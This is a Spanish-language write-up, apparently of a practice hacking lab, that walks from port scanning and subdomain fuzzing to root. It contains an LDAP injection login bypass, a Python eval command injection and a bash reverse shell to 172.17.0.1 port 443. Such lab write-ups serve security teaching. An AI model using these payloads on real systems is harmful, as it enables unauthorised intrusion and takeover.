nmap: 22,80

![image](https://github.com/user-attachments/assets/2b6eed0f-c4b9-4bcb-b84d-3fbfe9437982)


---
al hacer el nmap vemos que el puerto 80 tiene una pagina con "hl" al final

![image](https://github.com/user-attachments/assets/00fb62a3-401f-40ce-a6c6-046641820ccd)

lo que tenemos que agregar esa redirección en el  "/etc/hosts"
http://404-not-found.hl/

en la pagina principal ahora vemos eso y aceptamos el desafio:

![image](https://github.com/user-attachments/assets/ca2f05b7-9e39-4c8b-b1c6-ab6cef4f2fd4)


en la pagina hay cuadros con "pistas". hay una en código base64 

![image](https://github.com/user-attachments/assets/21c6bc7f-4b39-4991-b972-2e4f1fbf9b75)


que lo sacamos:
>echo "`UXVlIGhhY2VzPywgbWlyYSBlbiBsYSBVUkwu`" | base64 -d 

![image](https://github.com/user-attachments/assets/6ec0aa26-5305-4c98-8661-c514c470e5e8)


y nos da: Que haces?, mira en la URL. 

hacemos un:


    - wfuzz -c -u 404-not-found.hl -H "HOST: FUZZ.404-not-found.hl" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 28

nos da: info

![image](https://github.com/user-attachments/assets/e26da39b-a5fd-47dd-8b60-3489ca23bc2a)


metemos ese info en /etc/host como el primer URL que tenemos.
http://info.404-not-found.hl/
quedaría: info.404-not-found.hl

![image](https://github.com/user-attachments/assets/326bd27a-8218-48a8-8afe-9fff9203851d)


nos manda a un login y vamos probando credenciales por default. 
vemos el código fuente y al final hay un mensaje:
> I believe this login works with LDAP
> 
![image](https://github.com/user-attachments/assets/d2ed5af5-49d9-4b99-b3b5-c9694372c261)


buscamos credenciales de inyección de LDAP
probamos las inyección que tiene: https://book.hacktricks.xyz/v/es/pentesting-web/ldap-injection

![image](https://github.com/user-attachments/assets/7a5b62ab-8c46-4f74-bdb1-59d1f49849b7)

y sirve: 

        user=*)(|(&
         pass=pwd)

en el panel de admin nos da las credenciales: 

       - Nombre de usuario: `404-page`
       - Contraseña: `not-found-page-secret`

![image](https://github.com/user-attachments/assets/b5768cb3-21d1-44b2-a00b-df510322316e)


entramos por el ssh en el terminal y ahora buscamos como escalar hacia root.

![image](https://github.com/user-attachments/assets/c83ef588-3f2f-4658-8b07-95b98ff1dc96)


como se ve hay un calculadora.py se refiere a python y solo podemos ejecutar.

![image](https://github.com/user-attachments/assets/f6823809-e7f4-49d4-94ab-c37a7f896524)


encontramos un comando para ejecutar con python del programa que encontramos:
https://snyk.io/blog/command-injection-python-prevention-examples/

![image](https://github.com/user-attachments/assets/6d7098a9-2ec1-4a2d-8d01-b0f91aa1a879)


comando de ejecución:

     __import__('os').popen('ls').read()

![image](https://github.com/user-attachments/assets/aab997c9-6d97-4236-b52d-48cde834676b)


lo modificamos para una reverse shell para verificar: 

         __import__('os').popen("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'").read()

colocamos el puerto en escucha y estamos dentro del usuario 200-ok

![image](https://github.com/user-attachments/assets/ad34b515-d69e-4277-a76c-0c78e57d873c)

 buscamos como escalar y aparece un txt que se llama: 
>boss.txt que contiene: what is rooteable

![image](https://github.com/user-attachments/assets/6c1e67b2-2197-4aa4-8ffa-599292173d1e)


probamos rooteable como contraseña de root:

![image](https://github.com/user-attachments/assets/22834dc8-54b2-40bd-8709-4156b9c520fe)


su root / rooteable y somos root!: 
